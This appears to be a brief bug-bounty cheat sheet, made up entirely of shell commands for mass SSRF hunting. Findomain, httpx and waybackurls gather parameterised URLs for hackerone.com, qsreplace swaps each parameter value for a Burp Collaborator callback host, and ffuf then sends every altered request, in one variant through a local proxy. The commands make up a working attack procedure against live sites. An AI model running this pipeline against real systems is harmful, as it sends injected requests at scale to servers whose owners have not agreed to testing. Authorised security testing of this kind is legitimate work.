## In this case I'm using [Findomain](https://github.com/Findomain/Findomain)

```sh
findomain -t hackerone.com -q | httpx -silent -threads 1000 | waybackurls |  grep = | qsreplace http://YOUR.burpcollaborator.net | tee ssrf.txt
```

## FFUF
```sh
ffuf -w ssrf.txt:FUZZ -u FUZZ -mc 200
```

```sh
ffuf -u FUZZ -w ssrf.txt:FUZZ -replay-proxy http://127.0.0.1:8080 -mc 200
```
